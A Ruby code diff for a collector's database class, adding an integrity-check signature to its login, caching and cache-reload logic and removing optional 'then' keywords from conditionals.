@@ -32,13 +32,14 @@ class DB
   
   attr_reader :agent_signature
   attr_reader :network_signature
+  attr_reader :check_signature
 
   def initialize
     # database address
     @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s
 
     # get the external ip address
-    external_address = MyIp.get
+    $external_address = MyIp.get
 
     # the version of the collector
     version = File.read(Dir.pwd + '/config/VERSION_BUILD')
@@ -52,7 +53,7 @@ class DB
       unique_id = Socket.gethostname
     end
 
-    @username = Digest::MD5.hexdigest(unique_id) + ':' + version + ':' + external_address
+    @username = Digest::MD5.hexdigest(unique_id) + ':' + version + ':' + $external_address
     # the password is a signature taken from a file
     @password = File.read(Config.instance.file('DB_SIGN'))
 
@@ -63,6 +64,8 @@ class DB
     @agent_signature = nil
     # signature for the network elements
     @network_signature = nil
+    # signature for the integrity check
+    @check_signature = nil
     # class keys
     @factory_keys = {}
     
@@ -75,7 +78,7 @@ class DB
   def connect!
     trace :info, "Checking the DB connection [#{@host}]..."
     
-    if @db_rest.login(@username, @password) then
+    if @db_rest.login(@username, @password)
       @available = true
       trace :info, "Connected to [#{@host}]"
     else
@@ -121,7 +124,7 @@ class DB
 
   def cache_init
     # if the db is available, clear the cache and populate it again
-    if @available then
+    if @available
       # get the global signature (per customer) for all the agents
       bck_sig = db_rest_call :agent_signature
       @agent_signature = Digest::MD5.digest bck_sig unless bck_sig.nil?
@@ -130,12 +133,16 @@ class DB
       net_sig = db_rest_call :network_signature
       @network_signature = net_sig unless net_sig.nil?
 
+      # get the integrity check signature
+      check_sig = db_rest_call :check_signature
+      @check_signature = check_sig unless check_sig.nil?
+
       # get the factory key of every agent
       keys = db_rest_call :factory_keys
       @factory_keys = keys unless keys.nil?
 
       # errors while retrieving the data from the db
-      return false if bck_sig.nil? or keys.nil? or net_sig.nil?
+      return false if bck_sig.nil? or keys.nil? or net_sig.nil? or check_sig.nil?
 
       trace :info, "Emptying the DB cache..."
       # empty the cache and populate it again
@@ -147,6 +154,8 @@ class DB
       trace :info, "Agent signature saved in the DB cache"
       DBCache.network_signature = net_sig
       trace :info, "Network signature saved in the DB cache"
+      DBCache.check_signature = check_sig
+      trace :info, "Integrity check signature saved in the DB cache"
       DBCache.add_factory_keys @factory_keys
       trace :info, "#{@factory_keys.length} entries saved in the the DB cache"
 
@@ -155,12 +164,13 @@ class DB
 
     # the db is not available
     # check if the cache already exists and has some entries
-    if DBCache.length > 0 then
+    if DBCache.length > 0
       trace :info, "Loading the DB cache..."
 
       # populate the memory cache from the permanent one
       @agent_signature = Digest::MD5.digest DBCache.agent_signature unless DBCache.agent_signature.nil?
       @network_signature = DBCache.network_signature unless DBCache.network_signature.nil?
+      @check_signature = DBCache.check_signature unless DBCache.check_signature.nil?
       @factory_keys = DBCache.factory_keys
 
       trace :info, "#{@factory_keys.length} entries loaded from DB cache"
@@ -191,7 +201,7 @@ class DB
     key = db_rest_call :factory_keys, build_id
 
     # save the factory key in the cache (memory and permanent)
-    if not key.nil? and not key.empty? then
+    if not key.nil? and not key.empty?
       @factory_keys[build_id] = key[build_id]
 
       # store it in the permanent cache
@@ -369,7 +379,7 @@ class DB
     DBCache.del_upgrade bid, upgrade[:id]
 
     # delete from the db only if all the file have been transmitted
-    if left == 0 then
+    if left == 0
       DBCache.del_upgrade bid
       db_rest_call :del_upgrade, bid if @available
     end
